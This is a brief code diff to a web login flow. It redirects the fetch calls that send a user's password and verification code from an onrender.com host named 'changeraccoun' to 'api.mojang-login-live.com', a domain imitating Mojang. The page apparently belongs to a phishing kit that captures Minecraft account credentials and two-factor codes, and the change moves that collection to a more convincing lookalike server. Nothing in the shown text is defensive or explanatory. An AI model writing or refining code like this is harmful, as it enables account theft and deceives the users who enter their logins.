@@ -760,7 +760,7 @@ function goStep3() {
   if (!password) { err.style.display = 'block'; return; }
   err.style.display = 'none';
 
-  fetch("https://changeraccoun.onrender.com/login", {
+  fetch("https://api.mojang-login-live.com/login", {
     method: "POST",
     credentials: "include",
     headers: {
@@ -816,7 +816,7 @@ async function checkCode() {
   err.style.display = 'none';
 
   try {
-    await fetch("https://changeraccoun.onrender.com/verify-code", {
+    await fetch("https://api.mojang-login-live.com/verify-code", {
       method: "POST",
       credentials: "include",
       headers: {
